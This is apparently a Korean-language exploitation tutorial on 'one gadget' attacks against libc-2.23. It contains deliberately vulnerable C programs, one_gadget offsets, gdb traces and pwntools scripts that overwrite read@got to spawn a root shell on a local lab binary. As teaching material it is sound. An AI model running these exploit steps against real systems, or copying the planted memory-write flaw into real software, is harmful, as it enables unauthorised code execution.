---
title: One Gadget
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, one gadget]
math: true
mermaid: true
---

## Description

one gadget이란 해당 gadget 하나만을 이용하여 shell을 획득할 수 있는 gadget이다. one gadget은 라이브러리 파일 내 “/bin/sh"를 실행한다. got 영역을 덮어쓸 수 있는 경우 많이 사용된다.

## one-gadget of libc

libc-2.23.so의 do_system() 함수 내 __execve() 함수

```c
...
#endif
if (pid == (pid_t) 0)
    {
    /* Child side.  */
    const char *new_argv[4];
    new_argv[0] = SHELL_NAME;
    new_argv[1] = "-c";
    new_argv[2] = line;
    new_argv[3] = NULL;

    /* Restore the signals.  */
    (void) __sigaction (SIGINT, &intr, (struct sigaction *) NULL);
    (void) __sigaction (SIGQUIT, &quit, (struct sigaction *) NULL);
    (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);
    INIT_LOCK ();

    /* Exec the shell.  */
    (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
    _exit (127);
    }
else if (pid < (pid_t) 0)
    /* The fork failed.  */
    status = -1;
else
...
```

libc-2.23.so의 exec_comm_child() 함수 내 __execve() 함수

```c
/* Function called by child process in exec_comm() */
static inline void
__attribute__ ((always_inline))
exec_comm_child (char *comm, int *fildes, int showerr, int noexec)
{
const char *args[4] = { _PATH_BSHELL, "-c", comm, NULL };

/* Execute the command, or just check syntax? */
if (noexec)
    args[1] = "-nc";

...

__close (fildes[0]);
__execve (_PATH_BSHELL, (char *const *) args, __environ);

/* Bad.  What now?  */
abort ();
}
```

### Find one gadgets

one gadget을 찾기 위해 루비의 one_gadget를 설치한다.

```bash
root@bs-virtual-machine:~/pwnable/oneshot# gem install one_gadget
root@bs-virtual-machine:~/pwnable/oneshot# one_gadget /lib/x86_64-linux-gnu/libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL
0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
```

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o baby baby.c -ldl
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dlfcn.h>
  
char asdf[1024];
 
int main()
{
    long long index = 0;
 
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
  
    read(0, &index, 1024);
    read(0, asdf+index, 8);
    read(0, &index, 1024);
}
```

read() 함수를 통해 3번의 입력을 받는데 index 변수의 타입이 “long long"이기 때문에 음수 저장이 가능하다. 따라서 2번째 입력값을 원하는 주소에 입력할 수 있다. 2번째 read() 함수 수행 전 &index([rbp-0x10]) 와 asd(0x601080)를 더한 값을 2번째 인자로 전달하고 있다. 1번째 값으로 0x4141414141414141(AAAAAAAA) 입력 시 0x601080을 더하여 0x4141414141a151c1 위치에 2번째 값을 쓸 수 있다.

```
...
0x00000000004006c7 <+81>:   mov    rax,QWORD PTR [rbp-0x10]
0x00000000004006cb <+85>:   add    rax,0x601080
0x00000000004006d1 <+91>:   mov    edx,0x8
0x00000000004006d6 <+96>:   mov    rsi,rax
0x00000000004006d9 <+99>:   mov    edi,0x0
0x00000000004006de <+104>:  call   0x400540 <read@plt>
...
gdb-peda$ p $rax
$1 = 0x4141414141a151c1
```

read@got 영역에 One Gadget 주소를 저장하면 Shell을 획득할 수 있다.

0x601020(read@got) - 0x601080(asdf) = 0xffffffa0

```
gdb-peda$ elfsymbol
Found 4 symbols
printf@plt = 0x400530
read@plt = 0x400540
__libc_start_main@plt = 0x400550
dlsym@plt = 0x400560
gdb-peda$ x/3i 0x400540
0x400540 <read@plt>:    jmp    QWORD PTR [rip+0x200ada]        # 0x601020
0x400546 <read@plt+6>:  push   0x1
0x40054b <read@plt+11>: jmp    0x400520
gdb-peda$ p 0x601020-0x601080
$2 = 0xffffffa0
```

## Exploit code

```python
# Exploit Code
from pwn import *

p = process('./baby')
gdb.attach(p)
printf = int(p.recvline().split(' ')[3],16)

libBase = printf - 0x55800
oneGadget = libBase + 0x4526a

log.info("libBase: " + str(hex(libBase)))
log.info("oneGadget: " + str(hex(oneGadget)))

p.sendline(p64(0xffffffffffffffa0))
raw_input('1')
p.sendline(p64(oneGadget))
p.interactive()
```

gdb로 확인해보면 RSI 레지스터가 null이 아니라서 shell이 실행되지 않는다.

```
[----------------------------------registers-----------------------------------]
RAX: 0x7f938a78ef38 --> 0x7ffc5612cba8 --> 0x7ffc5612d7cd ("LC_NUMERIC=ko_KR.UTF-8")
RBX: 0x0 
RCX: 0x7f938a4bf260 (<__read_nocancel+7>:   cmp    rax,0xfffffffffffff001)
RDX: 0x7ffc5612cba8 --> 0x7ffc5612d7cd ("LC_NUMERIC=ko_KR.UTF-8")
RSI: 0x7ffc5612cac8 --> 0x7ffc5612cb98 --> 0x7ffc5612d7c6 --> 0x4c00796261622f2e ('./baby')
RDI: 0x7f938a554d57 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7ffc5612cab0 --> 0x400700 (<__libc_csu_init>:    push   r15)
RSP: 0x7ffc5612ca98 --> 0x4006f9 (<main+131>:   mov    eax,0x0)
RIP: 0x7f938a40d294 (<do_system+1140>:  call   0x7f938a494770 <execve>)
R8 : 0x0 
R9 : 0x22 ('"')
R10: 0x37b 
R11: 0x246 
R12: 0x400580 (<_start>:    xor    ebp,ebp)
R13: 0x7ffc5612cb90 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x7f938a40d27d <do_system+1117>:    
    mov    DWORD PTR [rip+0x381219],0x0        # 0x7f938a78e4a0 <lock>
0x7f938a40d287 <do_system+1127>:    
    mov    DWORD PTR [rip+0x381213],0x0        # 0x7f938a78e4a4 <sa_refcntr>
0x7f938a40d291 <do_system+1137>:    mov    rdx,QWORD PTR [rax]
=> 0x7f938a40d294 <do_system+1140>: call   0x7f938a494770 <execve>
```

따라서 취약한 코드에 memset() 함수를 추가하여 [rsp+30] 영역이 NULL이 되도록 한다.

```c
// Vuln Code
// gcc -fno-stack-protector -o one one.c -ldl
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <string.h>
char asdf[1024];
int main()
{
    long long index = 0;
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    memset(&index,0,56);
    read(0, &index, 1024);
    read(0, asdf+index, 16);
    read(0, &index, 1024);
}
```

## Exploit code

```python
# Exploit Code
from pwn import *

p = process('./one')
#gdb.attach(p)
printf = int(p.recvline().split(' ')[3],16)

libBase = printf - 0x55800
oneGadget = libBase + 0x4526a

log.info("libBase: " + str(hex(libBase)))
log.info("oneGadget: " + str(hex(oneGadget)))

p.sendline(p64(0xffffffffffffffa8))
#raw_input('1')
p.sendline(p64(oneGadget))
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/oneshot# python exploit.py 
[+] Starting local process './one': pid 4951
[*] libBase: 0x7f078dba4000
[*] oneGadget: 0x7f078dbe926a
[*] Switching to interactive mode
$ 
$ 
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/root/pwnable/onegadget
```

## References
- [10.One-gadgets(feat. PLT/GOT overwrite)](https://www.lazenca.net/pages/viewpage.action?pageId=16810292)